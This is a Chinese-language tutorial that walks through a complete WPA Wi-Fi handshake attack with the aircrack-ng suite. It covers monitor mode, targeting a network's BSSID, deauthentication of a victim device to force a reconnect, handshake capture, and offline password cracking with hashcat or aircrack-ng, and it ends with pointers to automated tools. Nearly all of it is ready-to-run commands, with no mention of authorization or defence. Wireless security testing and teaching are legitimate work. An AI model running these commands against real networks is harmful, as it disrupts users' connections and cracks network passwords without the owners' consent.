# WPA 握手包攻击

## 手动

1. 查看网络设备, 获取无线网卡名称.

    ```sh
    iwconfig
    ```

2. 开启无线网卡监听模式.

    ```sh
    sudo airmon-ng start wlan0
    ```

    若设备被占用, 执行下列命令来结束占用设备的进程:  

    ```sh
    sudo airmon-ng check kill
    ```

    开启监听模式后, 无线网卡名称发生改变. 后面会附加 `mon` (monitor), 即 `wlan0mon`.

    !!! warning
        监听模式开启后的无线网卡将无法访问 Internet, 直到监听模式被关闭.

3. 监听 Wi-Fi 信号.

    ```sh
    sudo airodump-ng wlan0mon
    ```

    当发现目标 Wi-Fi 时按 `Ctrl+C` 停止扫描. 并记录 BSSID 和 CH 两个参数.

4. 捕获指定 Wi-Fi 通信内容.

    ```sh
    sudo airodump-ng -w [.cap file] -c [CH] --bssid [BSSID] wlan0mon
    ```

5. 断开指定设备与指定 Wi-Fi 的链接.

    ```sh
    sudo aireplay-ng -0 5 -a [BSSID] -c [Target MAC] wlan0mon
    ```

    目标设备从指定 Wi-Fi 断开链接后将尝试重连, 会向路由器发送握手包. 而第 4 步将会捕获这个握手包.

6. 当第 4 步提示捕获握手包时按下 `Ctrl+C` 结束监听.

    此时, 握手包的数据已经被记录在第4步指定的 `.cap` 文件中.

7. 对 `.cap` 文件中握手包的 hash 进行破解.

    - 使用 Hashcat. (推荐)

        ```sh
        aircrack-ng [.cap file] -j [.haccpx file]       # 将 .cap 文件转为 hashcat 接受的 .haccpx 文件
        hashcat -m 2500 -a 0 [.hccapx file] [dict file] # 利用 hashcat 进行破解
        ```

    - 使用 aircrack-ng.

        ```sh
        aircrack-ng [.cap file] -w [dict file]
        ```

8. 关闭无线网卡监听模式.

    ```sh
    sudo airmon-ng stop wlan0mon
    ```

    若第 2 步中结束的进程没有自动恢复, 则需要手动启动.

## 自动化

可以借助 Airgeddon/[wifite2](https://github.com/derv82/wifite2)/[WEF](https://github.com/D3Ext/WEF) 等工具来自动化上述流程.
